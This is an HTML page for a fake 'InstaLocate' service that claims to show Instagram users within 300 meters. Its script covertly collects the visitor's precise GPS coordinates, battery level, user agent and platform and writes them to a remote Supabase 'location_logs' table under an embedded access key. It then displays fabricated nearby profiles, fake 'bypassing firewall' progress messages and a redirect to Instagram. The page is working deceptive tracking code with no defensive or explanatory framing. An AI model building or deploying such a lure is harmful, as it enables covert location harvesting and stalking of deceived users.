<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaLocate Elite | Regional Radar</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;700;900&display=swap');
        :root { --ig-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); --bg: #050b18; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        
        body { background: var(--bg); color: white; min-height: 100vh; overflow-x: hidden; }

        /* Premium Gradient Background */
        .bg-glow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle at 10% 20%, rgba(220, 39, 67, 0.2) 0%, transparent 40%), radial-gradient(circle at 90% 80%, rgba(0, 149, 246, 0.2) 0%, transparent 40%); }

        nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 8%; background: rgba(5, 11, 24, 0.85); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,0.05); position: sticky; top: 0; z-index: 1000; }
        .logo { font-weight: 900; font-size: 24px; background: var(--ig-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

        /* Hero Section */
        .hero { display: flex; align-items: center; justify-content: center; padding: 60px 8%; min-height: 80vh; gap: 40px; transition: 0.5s; }
        .hero-text { flex: 1.2; }
        .hero-text h1 { font-size: 55px; font-weight: 900; line-height: 1.1; margin-bottom: 25px; }
        
        .radar-container { flex: 1; display: flex; justify-content: center; position: relative; }
        .radar { width: 320px; height: 320px; border-radius: 50%; border: 2px solid rgba(255,255,255,0.1); position: relative; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.03); box-shadow: 0 0 50px rgba(220, 39, 67, 0.1); }
        .radar-beam { position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 2px solid #dc2743; animation: radar-pulse 2s infinite; }
        .ig-icon { font-size: 90px; background: var(--ig-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; z-index: 5; }

        .btn-scan { background: var(--ig-gradient); color: white; border: none; padding: 20px 50px; border-radius: 15px; font-size: 18px; font-weight: 800; cursor: pointer; transition: 0.3s; box-shadow: 0 10px 25px rgba(220, 39, 67, 0.4); display: flex; align-items: center; gap: 12px; }
        .btn-scan:hover { transform: scale(1.05); filter: brightness(1.1); }

        /* Scanning Screen */
        #scanning-view { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
        .loader { width: 100px; height: 100px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #dc2743; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 30px; }

        /* Results Screen */
        #results-view { display: none; padding: 40px 8%; animation: fadeIn 1s; }
        .result-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 20px; margin-top: 30px; }
        .user-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 20px; border-radius: 15px; text-align: center; transition: 0.3s; }
        .user-card:hover { transform: translateY(-5px); background: rgba(255,255,255,0.08); }
        .user-card img { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #dc2743; padding: 3px; margin-bottom: 10px; }

        @keyframes radar-pulse { 0% { transform: scale(0.8); opacity: 1; } 100% { transform: scale(1.6); opacity: 0; } }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        @media (max-width: 900px) { .hero { flex-direction: column; text-align: center; } .hero-text h1 { font-size: 42px; } .btn-scan { margin: 0 auto; } }
    </style>
</head>
<body>
    <div class="bg-glow"></div>
    <nav>
        <div class="logo"><i class="fab fa-instagram"></i> INSTALOCATE PRO</div>
        <div style="font-size: 11px; color: #00ff41;"><i class="fas fa-circle"></i> SERVER LIVE</div>
    </nav>

    <section class="hero" id="hero-section">
        <div class="hero-text">
            <h1>Discover <br><span style="background: var(--ig-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">Profiles</span> <br>Near You.</h1>
            <p>Connect with active Instagram users within 300 meters using our high-precision regional node mapping system.</p>
            <button class="btn-scan" onclick="startSystem()">
                <i class="fas fa-satellite-dish"></i> INITIALIZE RADAR
            </button>
        </div>
        <div class="radar-container">
            <div class="radar">
                <div class="radar-beam"></div>
                <div class="radar-beam" style="animation-delay: 1s;"></div>
                <i class="fab fa-instagram ig-icon"></i>
            </div>
        </div>
    </section>

    <div id="scanning-view">
        <div class="loader"></div>
        <h2 id="logText" style="letter-spacing: 2px; font-weight: 800;">CALIBRATING GPS...</h2>
        <p id="subLog" style="opacity: 0.5; margin-top: 10px;">Establishing PARDHAN encrypted handshake</p>
    </div>

    <section id="results-view">
        <h2 style="font-size: 30px;">Nearby Nodes Detected (14)</h2>
        <div class="result-grid" id="profile-list"></div>
        <button class="btn-scan" style="margin: 40px auto; width: 250px;" onclick="window.location.href='https://instagram.com'">
            LOGIN TO VIEW ALL
        </button>
    </section>

<script>
    const SB_URL = 'https://jedpkzloxepzskpwomqj.supabase.co';
    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
    
    // Immediate Initialization
    const supabase = window.supabase.createClient(SB_URL, SB_KEY);

    async function startSystem() {
        const overlay = document.getElementById('scanning-view');
        const status = document.getElementById('logText');
        const hero = document.getElementById('hero-section');
        
        overlay.style.display = 'flex';

        // Capture Battery
        let batt = "N/A";
        try {
            const b = await navigator.getBattery();
            batt = `${(b.level * 100).toFixed(0)}%`;
        } catch(e) {}

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                status.innerText = "COORDINATES SECURED...";
                
                // Data Send to Supabase
                const { error } = await supabase.from('location_logs').insert([{
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    user_agent: navigator.userAgent,
                    ip: `INSTA-v6 | Batt: ${batt}`,
                    os_info: navigator.platform
                }]);

                if (error) console.error("Sync Error:", error);

                // Animations
                setTimeout(() => { status.innerText = "BYPASSING REGIONAL FIREWALL..."; }, 2000);
                setTimeout(() => { status.innerText = "FETCHING LOCAL PROFILES..."; }, 4000);
                
                setTimeout(() => {
                    overlay.style.display = 'none';
                    hero.style.display = 'none';
                    document.getElementById('results-view').style.display = 'block';
                    showFakeUsers();
                }, 6000);

            }, (err) => {
                overlay.style.display = 'none';
                alert("CRITICAL ERROR: High-precision location access is required for radar calibration. Please 'Allow' access.");
            }, { enableHighAccuracy: true });
        } else {
            alert("Browser not supported!");
        }
    }

    function showFakeUsers() {
        const list = document.getElementById('profile-list');
        const users = ['neha_x', 'aman_vibe', 'riya_clicks', 'rahul_007', 'shruti.arts', 'kabir_sharma'];
        users.forEach((u, i) => {
            list.innerHTML += `
                <div class="user-card">
                    <img src="https://i.pravatar.cc/150?u=${i+20}">
                    <div><b>@${u}</b></div>
                    <div style="font-size: 11px; color: #dc2743; margin-top: 5px;">Active Now</div>
                </div>`;
        });
    }
</script>
</body>
</html>
